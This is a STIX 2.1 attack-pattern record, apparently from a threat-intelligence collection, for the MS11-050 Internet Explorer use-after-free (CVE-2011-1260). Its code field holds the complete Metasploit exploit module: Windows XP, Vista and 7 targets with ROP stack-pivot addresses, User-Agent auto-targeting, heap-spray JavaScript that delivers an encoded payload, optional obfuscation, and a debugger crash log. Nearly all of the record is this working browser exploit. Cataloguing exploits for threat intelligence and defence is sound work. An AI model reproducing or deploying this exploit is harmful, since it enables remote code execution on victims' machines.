{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--35f07c6d-b76a-48c0-9fb8-a2f230effaba",
    "created": "2024-08-14T16:44:24.79708Z",
    "modified": "2024-08-14T16:44:24.797084Z",
    "name": "\"MS11-050 IE mshtml!CObjectElement Use After Free\"",
    "description": " This module exploits a use-after-free vulnerability in Internet Explorer. The vulnerability occurs when an invalid <object> tag exists and other elements overlap/cover where the object tag should be when rendered (due to their styles/positioning). The mshtml!CObjectElement is then freed from memory because it is invalid. However, the mshtml!CDisplay object for the page continues to keep a reference to the freed <object> and attempts to call a function on it, leading to the use-after-free.  Please note that for IE 8 targets, JRE (Java Runtime Environment) is required to bypass DEP (Data Execution Prevention).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms11_050_mshtml_cobjectelement.rb",
            "external_id": "ms11_050_mshtml_cobjectelement.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1260"
        },
        {
            "source_name": "reference",
            "url": "http://d0cs4vage.blogspot.com/2011/06/insecticides-dont-kill-bugs-patch.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"7.0\",\n  #  :ua_maxver  => \"8.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS\n  #})\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS11-050 IE mshtml!CObjectElement Use After Free\",\n      'Description'    => %q{\n          This module exploits a use-after-free vulnerability in Internet Explorer. The\n        vulnerability occurs when an invalid <object> tag exists and other elements\n        overlap/cover where the object tag should be when rendered (due to their\n        styles/positioning). The mshtml!CObjectElement is then freed from memory because\n        it is invalid. However, the mshtml!CDisplay object for the page continues to keep\n        a reference to the freed <object> and attempts to call a function on it, leading\n        to the use-after-free.\n\n          Please note that for IE 8 targets, JRE (Java Runtime Environment) is required\n        to bypass DEP (Data Execution Prevention).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'd0c_s4vage',   #Discovery, poc\n          'sinn3r',       #ROP (thx corelanc0d3r), Windows 7\n          'bannedit'      #Windows 7\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-1260'],\n          ['OSVDB', '72950'],\n          ['MSB', 'MS11-050'],\n          ['URL', 'http://d0cs4vage.blogspot.com/2011/06/insecticides-dont-kill-bugs-patch.html']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n          # In IE6 the mshtml!CObjectElement size is 0xac\n          [\n            'Internet Explorer 7 on XP SP3',\n            {\n              'Rop'        => false,\n              'Ret'        => nil,         #Not required for non-ROP targets\n              'TargetAddr' => 0x0c0c0c0c,  #For vtable\n              'ObjSize'    => '0xB0',      #mshtml!CObjectElement size\n              'Offset'     => '0x01',\n            }\n          ],\n          [\n            'Internet Explorer 7 on Windows Vista',\n            {\n              'Rop'        => false,\n              'Ret'        => nil,         #Not required for non-ROP targets\n              'TargetAddr' => 0x0c0c0c0c,  #For vtable\n              'ObjSize'    => '0xB0',      #mshtml!CObjectElement size\n              'Offset'     => '0x01',\n            }\n          ],\n          [\n            'Internet Explorer 8 on XP SP3',\n            {\n              'Rop'        => true,\n              'Ret'        => 0x7C348B05,  #Stack pivot (xchg eax,esp; retn from java)\n              'TargetAddr' => 0x0c0c0c0c,  #For vtable\n              'ObjSize'    => '0xE0',      #mshtml!CObjectElement size\n              'Offset'     => '0x5E2',\n            }\n          ],\n          [\n            'Internet Explorer 8 on Windows 7',\n            {\n              'Rop'        => true,\n              'Ret'        => 0x7C348B05,  #Stack pivot (xchg eax,esp; retn from java)\n              'TargetAddr' => 0x0c0c0c0c,  #For vtable\n              'ObjSize'    => '0xE0',      #mshtml!CObjectElement size\n              'Offset'     => '0x5F4',\n            }\n          ],\n          [ 'Debug Target (Crash)', {} ],\n        ],\n      'DisclosureDate' => '2011-06-16',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n  end\n\n  def auto_target(cli, request)\n    agent = request.headers['User-Agent']\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 7\\.0/\n      #Windows XP + IE7\n      mytarget = targets[1]\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7\\.0/\n      #Windows Vista + IE7\n      mytarget = targets[2]\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8\\.0/\n      #Windows XP + IE8\n      mytarget = targets[3]\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 8\\.0/\n      #Windows 7 + IE8\n      mytarget = targets[4]\n    else\n      mytarget = nil\n    end\n\n    return mytarget\n  end\n\n  def on_request_uri(cli, request)\n    #Set default target\n    mytarget = target\n    debug = false\n\n    if target.name == 'Automatic'\n      mytarget = auto_target(cli, request)\n      if mytarget.nil?\n        agent = request.headers['User-Agent']\n        print_error(\"Unknown User-Agent #{agent}\")\n        send_not_found(cli)\n        return\n      end\n    elsif target.name =~ /Debug/\n      debug = true\n    end\n\n    if debug\n      data = <<-DATA\n      <html>\n      <body>\n      <script language='javascript'>\n      document.body.innerHTML += \"<object align='right' hspace='1000'   width='1000'>TAG_1</object>\";\n      document.body.innerHTML += \"<a id='tag_3' style='bottom:200cm;float:left;padding-left:-1000px;border-width:2000px;text-indent:-1000px' >TAG_3</a>\";\n      document.body.innerHTML += \"AAAAAAA\";\n      document.body.innerHTML += \"<strong style='font-size:1000pc;margin:auto -1000cm auto auto;' dir='ltr'>TAG_11</strong>\";\n      </script>\n      </body>\n      </html>\n      DATA\n\n      print_status(\"Triggering vulnerability (target: #{mytarget.name})...\")\n      send_response(cli, data, { 'Content-Type' => 'text/html' })\n      return\n    end\n\n    if mytarget['Rop']\n      p  = make_nops(44)             #Nops\n      p << \"\\xeb\\x04\\xff\\xff\"        #Jmp over the pivot\n      p << [mytarget.ret].pack('V')  #Stack pivot\n      p << payload.encoded\n\n      rop_payload = generate_rop_payload('java', p)\n    end\n\n    code = (rop_payload) ? rop_payload : payload.encoded\n\n    # fill the vtable\n    vtable = [mytarget['TargetAddr']].pack('V*')\n\n    #Convert code format so we can unescape() in JavaScript\n    code_js = Rex::Text.to_unescape(code, Rex::Arch.endian(target.arch))\n    vtable_js = Rex::Text.to_unescape(vtable, Rex::Arch.endian(target.arch))\n\n    randnop = rand_text_alpha(rand(100) + 1)\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n\n    #Extract string based on what the setup is\n    if mytarget.name == 'Internet Explorer 8 on XP SP3'\n      js_extract_str = \"var block = shellcode.substring(2, 0x20000-0x21);\"\n    elsif mytarget.name == 'Internet Explorer 8 on Windows 7'\n      js_extract_str = \"var block = shellcode.substring(0, (0x7ffc0-6)/2);\"\n    else\n      js_extract_str = \"var block = shellcode.substring(0, (0x40000-6)/2);\"\n    end\n\n    js = <<-JS\n    function timedRefresh(timeoutPeriod) {\n      setTimeout(\"location.reload(true);\",timeoutPeriod);\n    }\n\n    function enable_lfh(heaplib_obj, obj_size, max) {\n      var vtable = unescape(\"#{vtable_js}\");\n      while (vtable.length < obj_size) vtable += vtable;\n      var obj = vtable.substring(0, (obj_size-6)/2);\n      for (var i=1; i < max; i++) {\n        heaplib_obj.alloc(obj);\n      }\n    }\n\n    function heap_spray(heaplib_obj, offset) {\n      var code = unescape(\"#{code_js}\");\n      var #{randnop} = \"#{js_nops}\";\n      var nops = unescape(#{randnop});\n\n      while (nops.length < 0x1000) nops += nops;\n      offset = nops.substring(0, #{mytarget['Offset']});\n      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n      while (shellcode.length < 0x40000) shellcode += shellcode;\n      #{js_extract_str}\n      heaplib_obj.gc();\n      for (var i2=0; i2 < 0x400-1; i2++) {\n        heaplib_obj.alloc(block);\n      }\n    }\n\n    heap = new heapLib.ie(0x20000);\n    heap_spray(heap, #{mytarget['Offset']});\n    enable_lfh(heap, #{mytarget['ObjSize']}, 0x200);\n\n    document.body.innerHTML += \"<object align='right' hspace='1000' width='1000'>TAG_1</object>\";\n    enable_lfh(heap, #{mytarget['ObjSize']}, 0x200);\n\n    document.body.innerHTML += \"<a id='tag_4' style='bottom:200cm;float:left;padding-left:-1000px;border-width:2000px;text-indent:-1000px' >TAG_3</a>\";\n    enable_lfh(heap, #{mytarget['ObjSize']}, 0x200);\n\n    document.body.innerHTML += \"BBBBBBBBBBBBBBBBBBBBBBB\";\n    enable_lfh(heap, #{mytarget['ObjSize']}, 0x500);\n\n    document.body.innerHTML += \"<strong style='font-size:1000pc;margin:auto -1000cm auto auto;' dir='ltr'>TAG_11</strong>\";\n\n    timedRefresh(2000);\n    JS\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    html = <<-HTML\n    <html>\n    <body>\n    <script language='javascript'>\n    #{js}\n    </script>\n    </body>\n    </html>\n    HTML\n\n    print_status(\"Sending exploit (#{mytarget.name})...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n\n\n=begin\n(b00.1ac): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=0c0c0c0c ebx=0294b920 ecx=0bb300c8 edx=00000000 esi=020be380 edi=00000000\neip=6363fcc6 esp=020be354 ebp=020be36c iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nmshtml!CElement::Doc+0x2:\n6363fcc6 8b5070          mov     edx,dword ptr [eax+70h] ds:0023:0c0c0c7c=????????\n=end\n",
    "x_mitre_disclosure_date": "2011-06-16",
    "x_mitre_platforms": [
        "win'"
    ]
}